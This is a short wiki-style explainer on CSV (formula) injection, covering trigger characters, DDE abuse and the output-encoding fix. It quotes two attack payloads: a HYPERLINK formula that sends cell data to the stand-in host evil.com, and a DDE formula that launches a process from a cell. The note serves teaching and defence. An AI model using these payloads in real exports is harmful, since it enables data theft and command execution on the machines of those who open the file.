# CSV injection

## What it is
Like a Trojan horse hidden in a shipping manifest — a spreadsheet cell that *looks* like data but contains a formula command waiting to execute. CSV injection (also called formula injection) occurs when user-supplied data containing formula characters (`=`, `+`, `-`, `@`) is exported into a CSV file and then interpreted as executable formulas by spreadsheet applications like Excel or Google Sheets.

## Why it matters
An attacker registers for a web application using the username `=HYPERLINK("http://evil.com/steal?data="&A1,"Click me")`. When an admin exports user data to CSV and opens it, the formula executes silently — potentially exfiltrating data, launching remote commands via DDE (Dynamic Data Exchange), or tricking the admin into clicking a malicious link. This attack pivots from end-user input directly into an administrator's workstation.

## Key facts
- **Trigger characters**: Any cell value starting with `=`, `+`, `-`, or `@` can be interpreted as a formula by spreadsheet software.
- **DDE exploitation**: Older Excel versions allow `=cmd|'/C calc'!A0` — a payload that spawns processes directly from a cell, enabling arbitrary command execution.
- **Input validation is insufficient alone**: The fix requires output encoding — prepending a tab character or single quote to neutralize formula interpretation at the *export* stage.
- **OWASP-recognized**: CSV injection appears on OWASP's list of injection vulnerabilities; it is classified as an **output encoding failure**, not purely an input validation problem.
- **Scope**: The vulnerability lives in the *application generating the CSV*, not in Excel itself — the responsibility belongs to the developer exporting the data.

## Related concepts
[[Formula Injection]] [[Output Encoding]] [[DDE Attack]] [[Injection Attacks]] [[OWASP Top 10]]